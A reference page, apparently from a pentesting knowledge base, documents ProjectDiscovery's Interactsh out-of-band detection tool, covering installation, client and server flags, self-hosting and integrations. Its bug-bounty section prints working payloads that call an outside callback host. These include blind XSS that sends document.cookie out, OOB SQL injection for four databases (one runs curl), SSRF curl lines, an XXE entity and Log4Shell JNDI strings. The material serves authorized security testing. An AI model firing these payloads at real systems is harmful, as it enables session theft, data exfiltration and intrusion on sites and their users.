---
id: "interactsh"
title: "Interactsh - Out-of-Band Interaction Detection"
type: "tool"
category: "web-application"
subcategory: "oob-detection"
tags: ["oob", "blind-ssrf", "blind-xss", "blind-sqli", "dns-callback", "interactsh", "projectdiscovery"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
source_url: "https://github.com/projectdiscovery/interactsh"
related: ["nuclei-full", "burpsuite"]
updated: "2026-04-14"
---

## Overview

Interactsh is a client/server tool by ProjectDiscovery for detecting out-of-band (OOB) interactions. It solves the problem of blind vulnerabilities where the target processes your payload but returns no direct response. Supports DNS, HTTP(S), SMTP(S), LDAP, SMB, FTP(S) protocols with IPv4/IPv6 support.

Public servers: oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me
Web client: https://app.interactsh.com

## Installation

```bash
# Go install (requires Go 1.20+)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest

# Docker
docker run projectdiscovery/interactsh-client:latest
docker run projectdiscovery/interactsh-server:latest

# Brew
brew install interactsh
```

## Client Usage

```bash
# Basic - generate payload and listen
interactsh-client

# Multiple payloads
interactsh-client -n 5

# Connect to self-hosted server
interactsh-client -server yourdomain.com
interactsh-client -server yourdomain.com -token YOUR_AUTH_TOKEN

# Session persistence (resume after restart)
interactsh-client -sf interact.session

# Verbose output to file
interactsh-client -v -o interactsh-logs.txt

# JSON output
interactsh-client -json -o interactions.json

# Filter by protocol
interactsh-client -dns-only
interactsh-client -http-only
interactsh-client -smtp-only

# Pattern matching/filtering
interactsh-client -match ssrf
interactsh-client -filter noise

# Store payloads to file
interactsh-client -ps -psf payloads.txt

# Correlation ID tuning
interactsh-client -cidl 20 -cidn 13

# Pipe to notify
interactsh-client | notify
```

## Client Key Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-s, -server` | Interactsh server(s) | oast.pro, oast.live, etc |
| `-n, -number` | Number of payloads | 1 |
| `-t, -token` | Auth token for protected servers | - |
| `-pi, -poll-interval` | Poll interval in seconds | 5 |
| `-o` | Output file | - |
| `-json` | JSONL format output | false |
| `-v` | Verbose (full requests/responses) | false |
| `-sf, -session-file` | Session persistence file | - |
| `-dns-only` | Show only DNS interactions | false |
| `-http-only` | Show only HTTP interactions | false |
| `-smtp-only` | Show only SMTP interactions | false |

## Self-Hosted Server Setup

### 1. DNS Configuration
Set up NS records pointing to your VPS:
```
ns1.interact.yourdomain.com -> YOUR_VPS_IP
ns2.interact.yourdomain.com -> YOUR_VPS_IP
interact.yourdomain.com NS ns1.interact.yourdomain.com
interact.yourdomain.com NS ns2.interact.yourdomain.com
```

### 2. Launch Server
```bash
# Basic
interactsh-server -domain interact.yourdomain.com

# With authentication
interactsh-server -domain interact.yourdomain.com -auth
interactsh-server -domain interact.yourdomain.com -token MYSECRETTOKEN

# Custom ports
interactsh-server -domain interact.yourdomain.com -dns-port 53 -http-port 80 -https-port 443

# With disk storage
interactsh-server -domain interact.yourdomain.com -ds -dsp /data/interactsh

# With custom SSL certs
interactsh-server -domain interact.yourdomain.com -cert /path/cert.pem -privkey /path/key.pem

# Skip ACME (if providing own certs)
interactsh-server -domain interact.yourdomain.com -sa -cert cert.pem -privkey key.pem

# Enable all protocols
interactsh-server -domain interact.yourdomain.com -smb -ldap -ftp -responder

# File hosting for payloads
interactsh-server -domain interact.yourdomain.com -hd /path/to/payloads/

# Custom DNS records
interactsh-server -domain interact.yourdomain.com -cr custom-records.yaml

# Data retention
interactsh-server -domain interact.yourdomain.com -e 30  # 30 days
```

### Server Key Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-d, -domain` | Configured domain(s) | - |
| `-ip` | Public IP address(es) | auto-detect |
| `-a, -auth` | Enable random token auth | false |
| `-t, -token` | Set specific auth token | - |
| `-dns-port` | DNS port | 53 |
| `-http-port` | HTTP port | 80 |
| `-https-port` | HTTPS port | 443 |
| `-smtp-port` | SMTP port | 25 |
| `-ldap-port` | LDAP port | 389 |
| `-smb-port` | SMB port | 445 |
| `-ftp-port` | FTP port | 21 |
| `-ds, -disk` | Disk-based storage | false |
| `-e, -eviction` | Data retention days | 30 |
| `-hd, -http-directory` | Directory for file serving | - |
| `-sa, -skip-acme` | Skip ACME cert registration | false |

## Bug Bounty Usage Patterns

### Blind SSRF Detection
```bash
# Get your interactsh URL
interactsh-client
# Output: abcd1234.oast.pro

# Inject into URL parameters
curl "https://target.com/api/fetch?url=http://abcd1234.oast.pro"
curl "https://target.com/webhook" -d '{"callback_url":"http://abcd1234.oast.pro"}'
curl "https://target.com/proxy?u=http://abcd1234.oast.pro"

# Common injection points:
# - Webhook URLs, callback URLs, avatar/image URLs
# - PDF generators, URL preview/unfurl features
# - Import from URL, RSS feed URLs
# - API endpoint parameters (url=, uri=, path=, dest=, redirect=)
```

### Blind XSS Detection
```bash
# Payload with interactsh callback
"><script src=http://abcd1234.oast.pro></script>
"><img src=x onerror=fetch('http://abcd1234.oast.pro/'+document.cookie)>
'"><img src=http://abcd1234.oast.pro>

# Inject into:
# - Contact forms, support tickets, feedback forms
# - User profile fields (name, bio, address)
# - File upload names, email headers
# - Admin panels (log viewers, user management)
```

### Blind SQL Injection (OOB)
```bash
# MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.abcd1234.oast.pro\\a'))-- -

# MSSQL
'; EXEC master..xp_dirtree '\\abcd1234.oast.pro\a'-- -

# Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://abcd1234.oast.pro/'||user) FROM DUAL-- -

# PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'curl http://abcd1234.oast.pro/'||current_user-- -
```

### Blind XXE Detection
```xml
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abcd1234.oast.pro/xxe">
]>
<foo>&xxe;</foo>
```

### Log4Shell / JNDI
```
${jndi:ldap://abcd1234.oast.pro/a}
${jndi:dns://abcd1234.oast.pro/a}
```

## Integration with Other Tools

### Nuclei (native integration)
```bash
# Nuclei uses interactsh automatically for OOB templates
nuclei -u https://target.com -t oob/ -iserver your-interactsh-server.com -itoken TOKEN
```

### Burp Suite
Install the interactsh-collaborator extension from BApp Store.

### OWASP ZAP
Use the OAST add-on for ZAP integration.

### Caido
Use the quickssrf extension.

### Custom Scripts
```bash
# Generate URL, inject, check
URL=$(interactsh-client -n 1 -json 2>/dev/null | jq -r '.url')
# Use $URL in your payloads, client reports back interactions
```

## Self-Hosted vs Cloud

| Aspect | Cloud (oast.pro etc) | Self-Hosted |
|--------|---------------------|-------------|
| Setup | Zero config | DNS + server setup required |
| Reliability | Occasionally blocked by WAFs | Full control, custom domain |
| Privacy | Shared infrastructure | Your data stays on your server |
| Protocols | DNS, HTTP(S), SMTP | All protocols + SMB, LDAP, FTP |
| File hosting | No | Yes - serve XSS/XXE payloads |
| Custom DNS | No | Yes - cloud metadata records |
| Cost | Free | VPS + domain costs |

## Pro Tips

- Self-host when public interactsh domains are blocked by WAF/firewall
- Use `-sf` for session persistence across restarts
- Use custom DNS records for cloud metadata SSRF testing
- File hosting on self-hosted server enables serving XSS/XXE payloads
- Pipe to notify for real-time alerts on interactions
- Always check for DNS-only interactions (may indicate partial SSRF)
- Correlation IDs help track which payload triggered which interaction
